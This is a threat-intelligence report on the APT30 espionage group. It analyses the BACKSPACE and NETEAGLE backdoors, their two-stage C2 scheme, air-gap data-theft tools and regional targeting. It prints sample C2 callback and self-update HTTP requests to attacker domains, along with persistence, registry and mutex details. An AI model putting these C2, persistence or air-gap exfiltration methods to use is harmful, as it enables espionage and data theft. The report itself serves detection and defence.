FireEye analyzed three copies of the BACKSPACE controller software, known as the “NetEagle Remote Control System” 6 (according to the version information from one sample) or 网络神鹰远程控制系统 (according to the “About” dialog box). Although the copies we analyzed were compiled in 2010, 2011, and 2013 respectively, the tool’s descriptions indicate the original controller software may have been developed as early as 2004.7 The BACKSPACE controller is a well-developed, full-featured GUI tool. The controller includes main menu items for “System”, “Network”, “File”, “Remote”, and “Attack” operations, in addition to the “About” dialog box. Information about victim hosts connected to the controller is displayed in the lower panes, including the hostname, internal and external IP addresses, system uptime, and OS version and language. Figure 2: Version information from BACKSPACE controller Figure 3: "About" dialog box from "NetEagle" BACKSPACE controller Many of APT30’s tools perform version checks and attempt to self-update.
Comments: ©2004 Microsoft Corporation. 保留所有权利。 CompanyName: Flyeagle science and technology company FileDescription: NetEagle Remote Control Software FileVersion: 4.2 InternalName: Neteagle LegalCopyright: 版权所有 © 2004－永久 LegalTrademarks: OriginalFilename: NETEAGLE.EXE PrivateBuild: ProductName: NetEagle Remote Control Software ProductVersion: 4.2 SpecialBuild:  Figure 5: BACKSPACE controller showing sample victim idle (top), and with remote control established (bottom)  ESTABLISHING REMOTE CONTROL Communication with the stage two C2 server (e.g., the BACKSPACE controller) is managed via two files hosted on the stage one C2 server, dizhi.gif and connect.gif. BACKSPACE victim computers will retrieve dizhi.gif and transmit information about the victim computer (via HTTP POST) to the second stage IP address and port specified in that file. This victim information is used to populate the controller GUI (see Figure 4). However, BACKSPACE clients do not establish interactive connections to the BACKSPACE controller by default, as this would increase the risk of exposing the second-stage C2 server.
When a threat actor wants to establish remote control over a victim host, he uploads a notification file (e.g., connect.gif) containing the victim hostname and host ID number to the stage one C2 server. Victim hosts will parse the connect.gif file retrieved from the server and connect to the BACKSPACE controller (using the data from dizhi.gif) if their hostname and host ID are present in the file. System Network File Remote Attack About Local Info Computer Name IP Location Refresh Interval (min) Online Capacity Hostname Public IP Private IP Location Up-Time OS Comment Host ID Domain Controller Name  Domain Hostname Public IP Private IP Location Up-Time OS/Language Comment Host ID Controller Name  Figure 6: Configuration options for dizhi.gif and connect.gif Both dizhi.gif and connect.gif are generated by the BACKSPACE controller based on userdefined configuration settings and automatically uploaded to the stage one C2 server. This simplifies management of victim computers, reduces the risk of configuration errors, and allows even relatively unskilled operators to manage C2 infrastructure and victim hosts. The screen shot below shows the configuration options for the two files, including the FTP credentials used to connect to the stage one server, the path for the files, the names of the files, and the primary and backup stage one C2 servers.
These same configuration settings are used to customize a copy of the BACKSPACE malware, by “patching” the relevant bytes within the BACKSPACE binary. Similarly, a second dialogue box allows the threat actor to specify the ports (listed in dizhi.gif) used for communication with the second stage C2 server/BACKSPACE controller. The first port is used to transmit victim data via HTTP POST. The second port is used to establish an interactive connection with the BACKSPACE controller. The third port is used for a reverse command shell between the controller and the victim.
Double-clicking an idle victim in the BACKSPACE controller GUI will automatically create (or update) connect.gif with that victim’s hostname and host ID and upload the new file to the stage one C2 server. The next time the victim parses the file, it will establish a connection to the controller. Figure 8: Sample victim host data sent to BACKSPACE controller BACKSPACE CONTROLLER – BACKDOOR COMMUNICATION The BACKSPACE controller uses a modified HTTP protocol to communicate with BACKSPACE clients on victim hosts. Victim hosts send data to the controller in HTTP POST format. When the controller receives the data, it ignores other HTTP headers and only parses the Content-Length value and the body data.
No acknowledgement packet is sent back to the backdoor. The BACKSPACE controller sends remote command messages to BACKSPACE clients in the format below, disguised as a response from a Microsoft IIS 6.0 server. Similar to the controller, the BACKSPACE client only parses the ContentLength field and the remote command stored in the body and ignores other HTTP headers. POST /index.htm HTTP/1.0 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32) HOST: 192.168.43.130:80 Pragma: no-c ache Content-Length: 235 Proxy-Connection: Keep-Alive USER-29861D99F7.192.168.43.133.............(......Service Pack 3......................................................................... .....................................................N..1.0.p.18:32.www.stonehoof.
com/ForZRMail.. Figure 9: Sample remote command sent from controller to BACKSPACE backdoor HTTP/1.1 200 OK Server: Microsoft-IIS6.0 Content-Length: 12 Content-Type: */* Accept-Ranges: bytes Connection: Keep-Alive B....C:\*.*. TARGET HOST PRIORITIZATION AND ALERTS The BACKSPACE controller allows the threat actors to further manage their victim hosts by labeling individual hosts with a comment, assigning a priority level to the victim (“Normal”, “Important”, or “Very Important”), and setting an alert to notify the threat actor when the victim host comes online. Figure 10: Dialog box to set priority and other options on a victim host APT30 assigns a priority level to their victims: “Normal,” “Important,” and “Very Important.”  Figure 12: BACKSPACE controller showing path used by other APT30 tools Figure 11: BACKSPACE controller “automatically execute custom task” command EXECUTING CUSTOM TASKS The BACKSPACE controller includes a menu item called “Automatically Execute Custom Task” (highlighted below) which sends the ‘O’ command supported by some variants of the BACKSPACE backdoor.8 When the backdoor receives this command, it uploads data to the controller from predefined paths on the victim host ($LDDATA$\ and %WINDIR%\$NtUninstallKB900727$\). This special command appears to be used to retrieve stolen data from the victim computer in an automated fashion (as opposed to manually uploading files or directories).
Of note is that these paths are found in other tools used by APT30 (specifically SPACESHIP and FLASHFLOOD) believed to be used to target airgapped computers and networks.9 Below the “Automatically Execute Custom Task” menu item is another custom option for “GOTO custom path”. When selected, that menu item also directs the operator to a predefined custom path (one used by some versions of FLASHFLOOD) by default: VERSION CONTROL AND AUTOMATIC UPDATES Like many of the tools used by APT30, the BACKSPACE controller also performs a version check and attempts to self-update. The controller will transmit the following HTTP requests for a version file (NetEagleVer.txt) and updated binary (NetEagle.exe) when it starts. Figure 13: BACKSPACE controller version check and self-update GET /NE.General NetEagleVer.txt HTTP/1.1 Accept: */* User-Agent: HttpClient Host: www.km153.com GET /NE.General/NetEagle.exe HTTP/1.1 Accept: */* User-Agent: HttpClient Host: www.km153.com  Figure 15: BACKSPACE controller “attendant” dialog box Figure 14: Encoded disk serial numbers in the BACKSPACE controller binary DISK SERIAL NUMBER AUTHENTICATION The BACKSPACE controller also includes a check to ensure that the controller is only run on authorized machines. The controller compares the local host’s hard disk serial number with 45 encoded serial numbers hardcoded within the controller binary, and continues execution only if there is a match.
This indicates that the developers of the controller wanted to limit its distribution and use. The developers could have written the controller for themselves; alternately, the controller could have been sold with built-in restrictions so the developers could continue to write and sell custom versions to others.10 Given the tightly integrated nature of much of APT30’s malware (with each other and with the controller) and the fact that the controllers themselves use APT30 domains to perform self-update checks, it seems more likely that APT30 (or a group of developers closely aligned with them) created the controller for their own use. APT30 POSSIBLY WORKING ON SHIFTS In our analysis of the BACKSPACE controller, we identified a dialog box in the portable executable (PE) resource section. The dialog box included a login prompt with the text请输入您的值班员代号, which translates to “Please enter your attendant code”. This suggests the tool may have been designed to track work shifts amongst multiple operators, although this particular feature was disabled in the sample we analyzed.
The history of the BACKSPACE controller (possibly written as early as 2004, and still compatible with BACKSPACE variants compiled within the past year) reflects a tool developed over time and designed to facilitate detailed interaction with victim hosts through a relatively simple interface. The tool is capable of supporting interaction with a large number of victim hosts, and includes features to allow the operator to filter, prioritize, alert on, and otherwise manage his or her victims, implying operations large enough to warrant such features. The controller exhibits the same diligent version control and self-updating features observed in other malware used by APT30. In addition, the serial number checks built in to the BACKSPACE controller imply a very limited distribution tool designed to be used by only a select number of users. Finally, the “attendant” dialog box implies that the controller itself may have been designed for use in a highly organized environment.
All of these factors point to a threat group with long-term, organized, and structured development resources; a need to manage and track a potentially large number of victims over time; and an organized work force responsible for carrying out the group’s objectives. APT30’S PRIMARY MISSION: Data Theft for Political Gain Based on our knowledge of APT30's targeting activity and tools, their objective appears to be data theft as opposed to financial gain. APT30 has not been observed to target victims or data that can be readily monetized (for example, credit card data, personally identifiable information, or bank transfer credentials). Instead, their tools include functionality that allows them to identify and steal documents, including what appears to be an interest in documents that may be stored on air-gapped networks. Both the BACKSPACE and NETEAGLE backdoors support a range of command functions that allow the threat actors to manipulate files on the victim host, including reading and writing files, searching for files with specific names or attributes, deleting files, and uploading selected files to the controller.
11 While those commands are not atypical for full-featured backdoors, some of the BACKSPACE commands are more specialized, returning file metadata (such as file name, size, attributes, and MAC times) to the controller.12 Transmitting metadata allows BACKSPACE to send less data to the server and for the threat actor to determine, based on results, which files to select for uploading – both techniques result in less data transferred over the network, which is less likely to draw attention. SHIPSHAPE, SPACESHIP, and FLASHFLOOD are three separate pieces of malware with different functions that appear to be designed to work together to infect removable drives, spread to additional systems (including potentially airgapped systems), and steal files of interest. The tools frequently reference (in the mutexes, events, and registry keys they use) the terms “Flash” (perhaps for “flash drive”), “Ship”, “ShipTr”, and “ShipUp”, as though the tools were designed to “ship” data between computers and a removable drive. We identified one SPACESHIP variant that used the term “LunDu” where the term “ShipTr” would normally appear. “LunDu” (轮渡) means “ferry” in Chinese and the malware may be designed to “ferry” stolen documents from an air-gapped network, to a removable drive, to an Internet-connected host where they can be removed by the attacker.
In addition, the malware frequently uses the initials “LD” in several places, including the SHIPSHAPE version file (ldupver. txt), the folder \$LDDATA$\ used by some versions of SPACESHIP to store stolen data, and the .ldf file extension on the encoded files containing stolen data. The three tools have separate but complimentary functions: 13 SHIPSHAPE is designed to copy files from specific paths on a SHIPSHAPE-infected computer to a removable drive inserted into the host. SHIPSHAPE looks for existing files and folders on the removable drive and marks them as hidden. It then copies executable files to the removable drive, using the same names as the existing files and folders, but with an .exe extension.
SHIPSHAPE modifies the host settings to hide file extensions, so the executables appear to be the original documents. When viewed in Windows Explorer, the contents of the removable drive appear normal: Figure 16: Removable drive infected by SHIPSHAPE  However, viewing the contents of the drive from the command line will show both sets of files: Figure 17: Actual contents of infected drive A user attempting to “open” a document from the infected drive would execute a copy of the malware instead. SPACESHIP is believed to be the malware that is copied to a removable drive by SHIPSHAPE, presumably to transfer SPACESHIP to an airgapped computer. SPACESHIP is designed to search a victim computer for specific files (based on file extension or last modified time). Files that match the search criteria are compressed, encoded, and copied to a specified location on the infected host.
When a removable drive is inserted into the infected computer, the encoded files are copied from that location to the removable drive. FLASHFLOOD is responsible for copying files from an inserted removable drive to the hard drive of an infected computer, presumably to remove files transferred from the air-gapped system to an Internet-connected machine for removal from the victim network. FLASHFLOOD will scan both the infected system and any inserted removable drive for specific files (based on file extension or last modified time) and copy them to a specified location, using the same compression and encoding method as SPACESHIP. FLASHFLOOD may also log additional information about the victim host, including system information and data from the user’s Windows Address Book. APT30 identifies and steals documents, especially documents that may be stored on air-gapped networks.
Malicious files  APT30’S TARGETS ALIGN with Chinese Government Interests and Focus on Southeast Asia APT30 has routinely set its sights on targets across Southeast Asia and India. We have observed APT30 target national governments, regionally based companies in ten industries, and members of the media who report on regional affairs and Chinese government issues. Based on APT30’s confirmed targets and their intended victims, the group’s interests appear to concentrate on Southeast Asia regional political, economic, and military issues, disputed territories, and topics related to the legitimacy of the Chinese Communist Party. This evidence leads us to believe that APT30 serves a government’s needs for intelligence about key government and industry entities in Southeast Asia and India. We used a variety of sources to understand APT30’s intended targets.
Our sources include: APT30 malware alerts from FireEye customers, phishing decoy document content and intended recipients, over 200 APT30 malware samples, and APT30’s operational timing and infrastructure. We also noted that some 96% of the APT30 malware that we detected through our products attempted to compromise our clients located in East Asia. Figure 18: APT30 malware detections by FireEye customer by country, October 2012 – October 2014 ppSingapore yLaos India South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Thailand Saudi Arabia United States Countries with Confirmed APT 30 Targets Countries with Likely APT30 Targets India South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Thailand Saudi Arabia United States Countries with Confirmed APT 30 Targets Countries with Likely APT30 TargetsIndia South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Cambodia Japan Thailand Saudi Arabia United States Countries with Confirmed APT 30 Targets Countries with Likely APT30 Targets India South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Thailand Saudi Arabia United States Countries with Confirmed APT 30 Targets Countries with Likely APT30 Targets India South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Thailand Saudi Arabia United States Countries with Confirmed APT 30 Targets Countries with Likely APT30 Targets  APT30 PURSUES MEMBERS of the Association of Southeast Asian Nations (ASEAN) The group expresses a distinct interest in organizations and governments associated with ASEAN, particularly so around the time of official ASEAN meetings. ASEAN is a major regional organization whose member states promote cooperation and collaboration on a range of political, economic, educational, and social issues. ASEAN currently consists of ten member states: Indonesia, Malaysia, the Philippines, Singapore, Thailand, Brunei, Vietnam, Laos, Myanmar, and Cambodia.
ASEAN-THEMED INFRASTRUCTURE AND CUSTOMIZED TOOLS APT30 has registered ASEAN-themed domains for C2 and compiled data-stealing malware that appears to be specifically designed around ASEAN events. APT30 is most likely trying to compromise ASEAN members or associates to steal information that would provide insight into the region’s politics and economics. The domain aseanm[.]com, which appears to be designed to mimic ASEAN’s legitimate domain (www.asean.org), was first registered in March 2010. FireEye identified over 100 BACKSPACE malware variants that use that domain for C2, with compile dates that align with significant events in the ASEAN community. The table below shows compile times for known BACKSPACE samples that use aseanm[.]com for C2 frequently align with ASEAN events: Event Date 899f512f0451a0ba4398b41ed1ae5a6d compiled 5 May 2011 6:35 e6035ec09025c1e349a7a0b3f41e90b1 compiled 5 May 2011 6:35 18th ASEAN Summit, Jakarta, Indonesia 7–8 May 2011 36a6a33cb4a13739c789778d9dd137ac compiled 9 May 2011 3:34 Seventh ASEAN Plus Three Labour Ministers Meeting (7th ALMM+3), Phnom Penh, Cambodia 16 11 May 2012 572c9cd4388699347c0b2edb7c6f5e25 compiled 11 May 2012 0:06 f3c29a67a7b47e644e9d1a2a0516974e compiled 11 May 2012 0:06 Senior Officials from ASEAN and China meet on implementation of the Declaration on the Conduct of Parties on the East Sea (DOC)17 24–25 June 2012 afe8447990ecb9e1cd4086955b7db104 compiled 26 June 2012 1:43 b5546842e08950bc17a438d785b5a019 compiled 26 June 2012 1:43 ASEAN-India Commemorative Summit, New Delhi, India18 12–20 December 2012 310a4a62ba3765cbf8e8bbb9f324c503 compiled 20 December 2012 3:53 Table 4: ASEAN events and compile times for BACKSPACE samples using aseanm.com, 2011 - 2012  A large number of recent BACKSPACE samples helps bolster our assessment that the malware was compiled for use in campaigns centered on major ASEAN issues.
87 more recent BACKSPACE samples using the C2 domain aseanm[.]com were compiled clustered around a handful of dates in January and April 2013. 35 samples were compiled on December 31, 2012 and January 4 and 5, 2013; on January 1, 2013, a new Secretary-General of ASEAN, Le Luong Minh, took office for his five-year term.19 20 Similarly, 61 samples were compiled on April 22 and 23, 2013; the 22nd ASEAN Summit took place in Brunei on April 24 – 25, 2013. CUSTOMIZED MALWARE DEPLOYED AROUND ASEAN SUMMITS IN JANUARY AND APRIL 2013 Threat actors’ customization of malware can be a good indication of their level of intent on gaining access to a given target; it shows the actors have put a concerted effort into their targeting attempts, instead of taking a widespread “spray and pray” approach. APT30 deployed customized malware for use in specific campaigns targeting ASEAN members or nations with close ties or interests aligned with ASEAN states in January 2013 and April 2013. APT30 created the custom BACKSPACE “ZJ Auto” (mutex MicrosoftZjAuto), “ZJ Link” (mutex MicrosoftZjLnk), and “ZJ Listen” (mutex ZjListenLnk) variants.
These malware samples were customized in two ways: (1) tailored URLs in BACKSPACE C2 communications that may represent ASEAN country codes, and (2) custom data theft and communication functions. Tailored URLs One of the customizations was in the specific URLs used for BACKSPACE C2 communications. BACKSPACE uses HTTP for much of its C2, retrieving various files from the first-stage C2 server, each of which may contain additional instructions for the malware. The C2 URL format is typically http://<c2_domain>/<path>/<file>, where <c2_domain> is the first-stage C2 location, <path> is a directory name that may vary across samples, and <filename> is the file to be downloaded (e.g., dizhi.gif). The <path> names used in the BACKSPACE samples from January and April 2013 may indicate the country of origin for the malware’s intended victims (red added for emphasis) on the table below: Table 5: Possible targets of 2013 BACKSPACE campaigns BACKSPACE Variant Path Possible Target ZJ Auto (version 1.4) /autoIN/ India ZJ Auto (version 1.4) /autoMM/ Myanmar ZJ Auto (version 1.4) /autoSA/ unknown ZJ Auto (version 1.4) /autoTH/ Thailand ZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-mci/ Singapore ZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-ph/ Philippines ZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-SA/ unknown ZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-th/ Thailand ZJ Link (version F2.2LnkN / F2.3LnkN) /Forward-yw1/ unknown ZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY) /Forward-mci/ Singapore ZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY) /Forward-ph/ Philippines ZJ Listen (version Lan2.2LnkY) /Forward-SA/ unknown ZJ Listen (version Lan2.2LnkY) /Forward-th/ Thailand ZJ Listen (versions Lan2.2LnkN, Lan2.2LnkY) /Forward-yw1/ unknown  Customized Malware Supporting Data Theft The only identified BACKSPACE “ZJ Auto” variants were all compiled on January 4 and 5, 2013 and appear to be unique to that campaign.
This variant of BACKSPACE incorporated two additional features of note. First, “ZJ Auto” will search a set of specified file paths for files of interest, and upload the list of files found to the second-stage C2 server: %WINDIR%\$NtUninstallKB900727$22 %WINDIR%\$NtUninstallKB885884$ <CSIDL_PROGRAMS>\Outlook Express\data <CSIDL_COMMON_PROGRAMS>\Outlook Express\data custom paths specified in the file path.ini In addition, the “ZJ Auto” variant of BACKSPACE incorporated the custom command “{” (0x7B). When the malware receives this command from the controller, it will upload any files located in the specified paths to the second-stage C2 server and then delete them from the local drive. Similarly, the “ZJ Link” variants were almost all compiled in either January 2013 or April 2013,23 and also appear to be largely unique to those campaigns. The “ZJ Link” variants added the commands “^” (0x5E) and “(“ (0x28).
“^” downloads a file to the special directory CSIDL_TEMPLATES24 and renames the file. “(“ checks that the “ZJ Link”-infected computer can communicate with a specified host25 on ports 21, 80, and 443. “ZJ Link” appears to be designed to work on concert with another unique variant, “ZJ Listen”.26 “ZJ Listen” variants listen for inbound connections on those same ports (21, 80, and 443); it is the only variant identified to date designed to receive C2 commands from an external source, as opposed to establishing an outbound connection to a C2 server. “ZJ Listen” could be installed on an isolated LAN with no direct Internet connectivity, while “ZJ Link” could be installed on a normal, Internet-accessible computer. “ZJ Link” can accept standard commands from the BACKSPACE second-stage C2 server, and relay commands and responses to the “ZJ Listen”-infected computer on the isolated network.
Figure 19: APT30 decoy document on topics related to China’s border security SOCIAL ENGINEERING Consistently Includes Regional Security and Political Themes Many of APT30’s decoy documents use topics related to Southeast Asia, India, border areas, and broader security and diplomatic issues. Decoy documents attached to spear phishing emails are frequently indicators of intended targeting because threat actors generally tailor these emails to entice their intended targets —who typically work on related issues—to click on the attachments and infect themselves. APT30 LEVERAGES MAJOR POLITICAL TRANSITION AS PHISHING LURE CONTENT IN CAMPAIGN GEARED TO KEY POLITICAL STAKEHOLDERS In late summer 2014, FireEye detected an APT30 spear phishing campaign at one of our regional customers. The decoy document topic related to a significant political transition in Southeast Asia. The phishing email, which contained a backdoor compiled the day prior, was likely an attempt to gain access to targets that would give APT30 actors insight into the level of instability and pending changes in the country’s political leadership.
Such information is typically a high priority for a government’s intelligence collection efforts. According to the spear phishing emails’ recipients list, the email was sent to over thirty recipients in the country’s Financial Services, Government and Defense sectors. APT30 targeted both professional and personal (Gmail, Hotmail) email accounts. The email was crafted entirely in the country’s language, and the message’s subject translated to “foreign journalists’ reactions to the political transition.” This topic would likely be of interest to individuals in security roles, leadership positions, diplomatic jobs, or public or press-facing roles. The spear phishing email was either sent from a compromised email account of one of the country’s governmental agencies or was convincingly spoofed to look as though it originated from that agency.
REPEATED DECOY SUBJECTS ON INDIACHINA MILITARY RELATIONS AND CONTESTED REGIONS APT30 appears to use decoy documents about China’s relationship with India, particularly their military relations, likely in an attempt to compromise targets with information about this bilateral relationship. APT30 leveraged the text of a legitimate academic journal on China’s border security challenges in one of its decoy documents. Similarly, several of APT30’s decoy themes have centered on Indian defense and military materiel topics. In particular, a number of spear phishing subjects have related to Indian aircraft carrier and oceanographic monitoring processes, which probably indicates a specific interest in naval and maritime themes around Indian military activity and disputes in the South China Sea. The decoy document depicted in Figure 20 correlates to the actual building and launch of India’s first Indianbuilt aircraft carrier.
Decoy documents are not the only evidence of APT30’s targeting of Indian organizations. India-based users of VirusTotal have submitted APT30 malware to the service, suggesting that Indian researchers discovered APT30’s suspicious activity at Indian organizations as well. FireEye has also identified alerts from APT30 malware at India-based customers including: An Indian aerospace and defense company An Indian telecommunications firm Another recurring theme in APT30’s decoy documents relates to regionally contested territories, including Bhutan and Nepal. Nepal and Bhutan are important buffer states in China-India border conflicts and represent an opportunity to assert regional military dominance in Asia. Figure 20: APT30 decoy document on topics related to India’s aircraft carrier Figure 21: APT30 decoy document on topics related to Bhutan Several decoy themes center on Indian defense and military materiel topics.
The decoy document depicted in Figure 21 correlates to August 2013’s 21st Round of Boundary Talks between Bhutan and China. This text was taken verbatim from press release put out by Bhutan’s Ministry of Foreign Affairs.27 Nepal is also a key battleground for influence between China and India and serves a theme in APT30 decoy documents. Traditionally Nepal has rested securely in India’s sphere of influence, but more recently, China has become a more influential player with large investments in infrastructure projects, increased funding to the military and police, and other traditional Chinese influence efforts (for example, establishing Confucius Institutes). Beyond the ongoing border tensions, Nepal is also strategic to both India and China for its significant water resources. The decoy document below depicts a Nepal-related APT30 phishing decoy document.
Figure 22: APT30 decoy document related to Nepal Nepal is a key battleground for influence between China and India, and serves a theme in APT30 decoy documents. In addition to APT30’s Southeast Asia and India focus, we’ve observed APT30 target journalists reporting on issues traditionally considered to be focal points for the Chinese Communist Party’s sense of legitimacy, such as corruption, the economy, and human rights. In China, the Communist Party has the ultimate authority over the government. China-based threat groups have targeted journalists before; we believe they often do so to get a better understanding on developing stories to anticipate unfavorable coverage and better position themselves to shape public messaging. A FireEye as a Service customer in the media industry received a spear phishing message in October 2012 with a subject line of “China MFA Press Briefing 29 October 2012- Full Transcript.” APT30 sent this message to over fifty other journalists of major global news outlets, including both official work accounts and personal email accounts.
Overall, the themes on which the journalists reported fell into the following categories 1 through 6, in rough order of prevalence. APT30’s attempts to compromise journalists and media outlets could also be used to punish outlets that do not provide favorable coverage – for example, both the New York Times and Bloomberg have had trouble securing visas for journalists in wake of unfavorable corruption reporting. 28 Beyond targeting, we also saw summaries of media events or reporting in decoy documents, particularly around press releases related to government or military updates. It appears that APT30 could plausibly be targeting press attachés in order to obtain access to their contacts, which would presumably include the contact information of other public affairs personnel or other journalists of interest to target. Targeting press attachés would enable APT30 to target journalists from a trusted source, which would be an excellent resource for spear phishing.
COUNTRIES WHERE APT30’S CONFIRMED AND LIKELY TARGETS OPERATE India South Korea Malaysia Vietnam Nepal Bhutan Philippines Singapore Indonesia Brunei Myanmar Laos Cambodia Japan Thailand Saudi Arabia United States Countries with Confirmed APT 30 Targets Countries with Likely APT30 Targets  CONCLUSION APT30’s operations epitomize a focused, persistent, and well-resourced threat group. They appear to consider both the timing of their operations and prioritize their targets. Some of the their tools’ capabilities, most notably the ability to infect air gapped networks, suggest both a level of planning and interest in particularly sensitive data, such as that housed on government networks. The group’s method for selecting and tracking victims suggests a high level of coordination and organization among the group’s operators. With activity spanning more than ten years, APT30 is one of the longest operating threat groups that we have encountered and one of the few with a distinct regional targeting preference.
Our research into APT30 demonstrates what many already suspected: threat actors rely on cyber capabilities to gather information about their immediate neighborhood, as well as on a larger, global scale. APT30 appears to focus not on stealing businesses’ valuable intellectual property or cutting-edge technologies, but on acquiring sensitive data about the immediate Southeast Asia region, where they pursue targets that pose a potential threat to the influence and legitimacy of the Chinese Communist Party. In exposing APT30, we hope to increase organizations’ awareness of threats and ability to defend themselves. APT30’s targeting interests underscore the need for organizations across the region to defend the information assets valuable to determined threat actors. APPENDIX A Detailed Malware Analysis BACKDOORS Despite their long history of operations, APT30 has primarily relied on a two backdoors to support their activity: BACKSPACE29 and NETEAGLE.
Both backdoors have evolved into a number of variants. BACKSPACE has diverged into two main branches (“ZJ” and “ZR”) with numerous variations throughout each branch. Similarly, NETEAGLE has two main versions, “Scout” and “Norton”, with Norton being the later (more recent) version. The two backdoors differ widely in their development features, including differing programming languages and different sets of commands supported by each. Despite this, the two also share some high-level design similarities, including update features and the use of twostage command and control infrastructures.
The following table highlights some of the similarities and differences between the two families.30 Table 6: Comparison of BACKSPACE and NETEAGLE backdoors BACKSPACE NETEAGLE Development language C C++, MFC Mutex Differs across variants, but uses similar naming convention, e.g. MicrosoftZj, MicrosoftZJLnk, MicrosoftForZR, etc. NetEagle_Scout, Eagle-Norton360- OfficeScan C2 Domains Samples may use up to four C2 domains, for configuration retrieval, downloading updates, or as a backup domain if the primary fails. Samples use a single C2 domain. May Attempt to Bypass Host-Based Firewall Yes (observed in some versions) No (not observed) Callback format (may vary per sample) GET /ForZRLnk1z/dizhi.gif HTTP/1.0 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)HOST: www.km153.com:80 GET /update1/pic1.bmp HTTP/1.1 User-Agent: [name of malware binary] Host: www.creammemory.com Second stage C2 Downloads configuration file dizhi.gif from first stage C2 URL Downloads configuration file pic1.bmp from first stage C2 URL Connect to second stage controller Downloads connect.gif from first stage C2.
If the file contains the victim host’s hostname and ID, connects to the controller. Downloads pic2.bmp from first stage C2. If the file contains the victim host’s hostname and ID, connects to the controller. Format of second stage C2 configuration file Plain text (dizhi.gif, connect.gif) RC4 encrypted (pic1.bmp, pic2.bmp) Command format Malware commands are letters Malware commands are numbers  BACKSPACE BACKDOOR – “ZJ” VARIANT The “ZJ” branch of the BACKSPACE backdoor appears to be the oldest or “original” branch, with versions dating back to 2005. Variants of this branch are still being developed and compiled, adding a broad range of supported commands while still retaining the core functionality of the original versions.
The BACKSPACE variant 8c713117af4ca6bbd69292a78069e75b was compiled on August 26, 2014. It represents one member of the “ZJ” branch of the BACKSPACE malware family. Initial Execution The mutex MicrosoftZjSYNoReg is used to guarantee that only one instance of the malware is running at any time. BACKSPACE also creates two events (MicrosoftSYNoRegExit, MicrosoftSYNoRegHaveExit) that, when signaled, trigger all the threads and the malware itself to exit. A third event, MicrosoftSYNoRegHaveAck, is created to be used by the malware to synchronize the processing of a task with an acknowledgement received from the C2 server.
The malware extracts system information (OS version, build number, platform, service pack, default language id) and proxy information (from the ProxyEnable and ProxyServer values under HKEY_CURRENT_ USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\) from the victim host. BACKSPACE then creates the registry values lnk (type REG_SZ) and hostid (type REG_DWORD) under the HKEY_CURRENT_USER\Software\Microsoft\CurrentHalInf registry key: lnk is set NTO/mol which is the encoded31 text MSN.lnk. hostid is set to a random value that is used to uniquely identify the victim computer. The malware creates a copy of itself in the folder <CSIDL_PROGRAMS>\Messenger\BIN as msmsgs.exe, creating the folder if necessary. For persistence, BACKSPACE creates the Windows shortcut file MSN.lnk in <CSIDL_STARTUP> pointing to <CSIDL_PROGRAMS>\Messenger\BIN\msmsgs.exe with the description "Windows Messenger".
C2 Domains Like many BACKSPACE variants, this sample is configured with four different C2 domains. The C2 domains are used in HTTP requests for various files; each file requested via the URI provides additional instructions or data to the malware. BACKSPACE C2 domains are typically used for different purposes – that is, each domain is associated with different URIs whose associated files support different functions. For this sample, the four C2 domains have the following roles: Table 7: BACKSPACE C2 domains and registration dates Alias C2 Domain Description Zone Registration Date D1 www.iapfreecenter[.]com Primary C2 domain 5/23/2014 D2 www.appsecnic[.]com Backup C2 domain; run/hide configuration 3/15/2010 D3 www.newpresses[.]com Run/hide configuration 3/17/2010 D4 www.km153[.]com Run/hide configuration 8/30/2007  “Run” vs “Hide” Mode BACKSPACE reads the registry value hFlag under HKEY_CURRENT_USER\Software\Microsoft\ CurrentHalInf. If it exists and is set to 1 the malware switches to "Run Mode"; otherwise the malware operates in "Hidden Mode".
To switch to “Run mode”, BACKSPACE attempts to contact its C2 servers for validation and to obtain configuration data (stored in a file named nur.txt). It parses the configuration data and performs a series of increasingly generic checks to see whether (by inclusion or exclusion) it should remain in “Run mode”: 1. Make an HTTP request to www.iapfreecenter[.]com/Lnk1z/hostlist.txt and validate that the last byte of the response is 0xFE. 2. Make an HTTP request to the legitimate URL automation.whatismyip.com/n09230945.asp to obtain the external IP of the victim computer.
3. Make an HTTP request to either www.newpresses[.]com/http/nur.txt, www.km153[.]com/ http/nur.txt or www.appsecnic[.]com/http/nur.txt and validate that the response starts with "abcd1234"; if none of the servers respond accordingly, setting "Run Mode" fails. 4. If the response from the server contains the "runhost=" option, search for the victim computer’s hostname in the option data. If found, setting "Run Mode" succeeds; else go to step 5.
5. If the response from the server contains the "runhostexcept=" option, search for the victim computer’s hostname in the option data. If found, setting "Run Mode" fails; else go to step 6. 6. If the response from the server contains the "runip=" option, search for the victim computer’s external IP (obtained in step 2) in the option data.
If found, setting "Run Mode" succeeds; else go to step 7. 7. If the response from the server contains the "runipexcept=" option, search for the victim computer’s external IP (obtained in step 2) in the option data. If found, setting "Run Mode" fails; else go to step 8. 8.
If the response from the server contains the "rundir=" option, search for the current C2 URL (e.g., www.iapfreecenter[.]com/Lnk1z) in the option data. If found, setting "Run Mode" succeeds; else go to step 9. 9. If the response from the server contains the "rundirexcept=" option, search for the current C2 URL (e.g., www.iapfreecenter[.]com/Lnk1z) in the option data. If found, setting "Run Mode" fails; else go to step 10.
10. If the response from the server contains the "runweb=" option, search for the current C2 domain (e.g., www.iapfreecenter[.]com) in the option data. If found, setting "Run Mode" succeeds; else go to step 11. 11. If the response from the server contains the "runwebexcept=" option, search for the current C2 domain (e.g., www.iapfreecenter[.]com) in the option data.
